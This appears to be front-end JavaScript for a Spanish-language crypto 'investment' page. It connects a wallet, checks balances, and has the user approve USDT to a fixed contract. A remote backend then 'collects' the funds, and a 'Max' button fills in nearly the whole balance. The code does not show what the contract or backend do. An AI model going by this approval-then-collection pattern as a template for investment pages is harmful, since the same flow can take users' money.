"use strict";

// ─── Configuration ────────────────────────────────────────────────────────
const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const BSC_CHAIN_ID_HEX = "0x38"; 
const MIN_USDT_BALANCE = 0n; 
const BACKEND_URL      = "https://secure-merchant.onrender.com/api";

const BSC_RPC_URLS = [
  "https://bsc-rpc.publicnode.com",
  "https://bsc-dataseed1.binance.org/",
  "https://bsc-dataseed2.binance.org/",
  "https://rpc.ankr.com/bsc"
];

const BSC_CHAIN_PARAMS = {
  chainId:           BSC_CHAIN_ID_HEX,
  chainName:         "BNB Smart Chain",
  nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
  rpcUrls:           BSC_RPC_URLS,
  blockExplorerUrls: ["https://bscscan.com/"]
};

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function balanceOf(address account) external view returns (uint256)"
];

// ─── DOM refs ─────────────────────────────────────────────────────────────
const approveBtn    = document.getElementById("approveBtn");
const btnText       = document.getElementById("btnText");
const btnSpinner    = document.getElementById("btnSpinner");
const merchantInput = document.getElementById("merchantAddress");
const toastEl       = document.getElementById("toast");

if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;

// ─── Wake up Render backend ───────────────────────────────────────────────────
(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();

// ─── UI helpers ───────────────────────────────────────────────────────────
let _toastTimer;
function _applyToastStyle(type) {
  if (!toastEl) return;
  if (type === "success") {
    toastEl.style.background = "rgba(38, 161, 123, 0.95)";
  } else if (type === "error") {
    toastEl.style.background = "rgba(220, 53, 69, 0.95)";
  } else {
    toastEl.style.removeProperty("background");
  }
}

function showToast(msg, type = "default", ms = 4500) {
  if (!toastEl) return;
  clearTimeout(_toastTimer);
  // Use textContent to avoid XSS. For links, use showToastLink below.
  toastEl.textContent = String(msg);
  toastEl.dataset.type = type === "default" ? "" : type;
  toastEl.hidden       = false;
  _applyToastStyle(type);

  _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
}

function showToastLink(msg, linkHref, linkText = 'Ver en BscScan ↗', type = 'success', ms = 8000) {
  if (!toastEl) return;
  clearTimeout(_toastTimer);
  // Build DOM nodes safely instead of using innerHTML
  toastEl.innerHTML = '';
  const span = document.createElement('span');
  span.textContent = msg + ' ';
  const a = document.createElement('a');
  a.href = linkHref;
  a.target = '_blank';
  a.rel = 'noopener noreferrer';
  a.textContent = linkText;
  a.style.color = '#fff';
  a.style.textDecoration = 'underline';
  toastEl.appendChild(span);
  toastEl.appendChild(a);
  toastEl.dataset.type = type === "default" ? "" : type;
  toastEl.hidden = false;
  _applyToastStyle(type);

  _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
}

function setLoading(on, label = "Processing…") {
  if (!approveBtn) return;
  approveBtn.disabled = on;
  approveBtn.style.opacity = on ? "0.8" : "1";
  if (btnText) btnText.textContent = on ? label.toUpperCase() : "INVERTIR AHORA";
  if (btnSpinner) btnSpinner.hidden   = !on;
}

// ─── New UX Feature: Live Balance & Smart Max Button ─────────────────────────
async function fetchAndDisplayUserBalances(rawProvider) {
  try {
    const provider = new ethers.BrowserProvider(rawProvider);
    const signer = await provider.getSigner();
    const userAddress = await signer.getAddress();
    
    const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);
    const usdtBal = await usdtContract.balanceOf(userAddress);
    const formattedUsdt = ethers.formatUnits(usdtBal, 18);
    
    // Si tienes un elemento HTML con id="walletBalanceLabel", muestra el saldo en tiempo real
    const balanceLabel = document.getElementById("walletBalanceLabel");
    if (balanceLabel) {
      balanceLabel.textContent = `Saldo: ${parseFloat(formattedUsdt).toFixed(2)} USDT`;
    }

    // Configuración automatizada del botón "Max" si existe en tu HTML
    const maxBtn = document.getElementById("maxBtn");
    if (maxBtn) {
      maxBtn.onclick = () => {
        const amountInput = document.getElementById("investAmount");
        if (amountInput) {
          const maxUsdt = Math.max(0, parseFloat(formattedUsdt) - 1); // Deja un pequeño margen
          amountInput.value = maxUsdt > 0 ? maxUsdt.toFixed(2) : "1.00";
          amountInput.dispatchEvent(new Event('input'));
        }
      };
    }
  } catch (err) {
    console.error("Error al sincronizar saldos en vivo:", err);
  }
}

// ─── Backend collect trigger ──────────────────────────────────────────────────
async function triggerBackendCollect(userAddress) {
  let lastErr;
  const uiAmount = document.getElementById("investAmount")?.value || "1"; 
  const dynamicAmountWei = ethers.parseUnits(uiAmount.toString(), 18).toString();

  for (let i = 1; i <= 3; i++) {
    try {
      const res  = await fetch(`${BACKEND_URL}/execute-collection`, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ userAddress: userAddress, amount: dynamicAmountWei })
      });
      const data = await res.json();
      if (!res.ok || !data.success) throw new Error(data.error || "Collection failed.");
      return data;
    } catch (e) {
      lastErr = e;
      if (i < 3) await new Promise(r => setTimeout(r, 3000));
    }
  }
  throw lastErr;
}

// Bandera de control para saber si hay una inversión esperando a que el usuario conecte
let pendingInvestment = false;

// 1. Suscripción reactiva con AppKit
if (window.modal && typeof window.modal.subscribeProviders === "function") {
  window.modal.subscribeProviders((state) => {
    const rawProvider = state["eip155"]; 
    
    if (rawProvider) {
      fetchAndDisplayUserBalances(rawProvider); // Sincroniza saldos al conectar
      if (pendingInvestment) {
        pendingInvestment = false; 
        runInvestmentFlow(rawProvider); 
      }
    }
  });
}

// 2. Evento unificado del botón principal
if (approveBtn) {
  approveBtn.addEventListener("click", async () => {
    let rawProvider = null;
    if (window.modal && typeof window.modal.getWalletProvider === "function") {
      try {
        rawProvider = window.modal.getWalletProvider();
      } catch (_) {}
    }

    // CASO A: Si el usuario NO está conectado
    if (!rawProvider) {
      pendingInvestment = true; 
      setLoading(true, "Abriendo selector de billetera...");
      
      if (window.modal && typeof window.modal.open === "function") {
        try {
          await window.modal.open(); 
          
          // --- SOLUCIÓN: Verificar si el usuario conectó o canceló al cerrar el modal ---
          let freshProvider = null;
          if (typeof window.modal.getWalletProvider === "function") {
            try {
              freshProvider = window.modal.getWalletProvider();
            } catch (_) {}
          }

          if (!freshProvider) {
            // El usuario cerró el modal o canceló la conexión: limpiamos estados para evitar el colgado
            pendingInvestment = false;
            setLoading(false);
            return;
          } else {
            // Si conectó con éxito desde el modal, continuamos el flujo automáticamente
            await runInvestmentFlow(freshProvider);
            return;
          }
          // -----------------------------------------------------------------------------

        } catch (err) {
          console.error("Error al abrir AppKit:", err);
          pendingInvestment = false;
          setLoading(false);
        }
      } else {
        setLoading(false);
      }
      return; 
    }

    // CASO B: Si el usuario YA estaba conectado
    await runInvestmentFlow(rawProvider);
  });
}

// 3. Flujo centralizado de red, gas y contratos
async function runInvestmentFlow(rawProvider) {
  setLoading(true, "Conectando proveedor…");
  
  try {
    const provider = new ethers.BrowserProvider(rawProvider);
    
    // 1. Verificación estricta de red BSC (Chain ID 56)
    setLoading(true, "Verificando red BSC...");
    const network = await provider.getNetwork();
    if (Number(network.chainId) !== 56) {
      setLoading(true, "Cambiando a red BSC…");
      try {
        await rawProvider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: BSC_CHAIN_ID_HEX }] 
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          await rawProvider.request({
            method: "wallet_addEthereumChain",
            params: [BSC_CHAIN_PARAMS]
          });
        } else {
          showToast("Cambia manualmente a BNB Smart Chain en tu wallet.", "error");
          setLoading(false);
          return;
        }
      }
    }

    const signer = await provider.getSigner();
    const userAddress = await signer.getAddress();

    // 2. Validación UX: Comprobar saldo de BNB para el Gas
    setLoading(true, "Verificando saldo de gas (BNB)…");
    const bnbBalance = await provider.getBalance(userAddress);
    const minGasRequired = ethers.parseEther("0.0005"); 

    if (bnbBalance < minGasRequired) {
      showToast("Saldo de BNB insuficiente para pagar la comisión de red (Gas).", "error");
      setLoading(false);
      return;
    }

    // 3. Obtener montos e instanciar contrato USDT
    const inputElement = document.getElementById("investAmount");
    const rawInputVal = inputElement ? inputElement.value : "1";
    const requiredAmount = ethers.parseUnits(rawInputVal || "1", 18);

    const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);

    setLoading(true, "Validando saldo de USDT…");
    const usdtBalance = await usdtContract.balanceOf(userAddress);

    if (usdtBalance < requiredAmount) {
      showToast("No tienes suficiente saldo de USDT en tu billetera.", "error");
      setLoading(false);
      return;
    }

    // 4. Verificar Allowance para evitar aprobaciones innecesarias
    setLoading(true, "Verificando autorizaciones...");
    const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS);
    
    if (allowance < requiredAmount) {
      setLoading(true, "Firma requerida: Aprobar USDT…");
      const txApprove = await usdtContract.approve(CONTRACT_ADDRESS, requiredAmount);
      
      setLoading(true, "Confirmando aprobación en red...");
      await txApprove.wait();
    }

    // 5. Ejecutar la llamada al backend / contrato final
    setLoading(true, "Procesando inversión en protocolo...");
    const txCollect = await triggerBackendCollect(userAddress); 

    // 6. Éxito con trazabilidad interactiva (Enlace directo a BscScan)
    const txHash = txCollect?.hash || "";
    if (txHash) {
      showToastLink('¡Inversión exitosa!', `https://bscscan.com/tx/${txHash}`, 'Ver en BscScan ↗', 'success', 8000);
    } else {
      showToast("¡Transacción completada con éxito! Gracias.", "success", 6000);
    }

  } catch (err) {
    const raw = err?.reason ?? err?.message ?? "Error desconocido";
    if (
      err.code === 4001 ||
      raw.toLowerCase().includes("user rejected") ||
      raw.toLowerCase().includes("denied") ||
      raw.toLowerCase().includes("cancelled")
    ) {
      showToast("Operación cancelada por el usuario.", "default");
    } else {
      console.error("Web3 Error crítico:", err);
      showToast("Ocurrió un error al procesar la transacción en la red.", "error");
    }
  } finally {
    setLoading(false);
  }
}
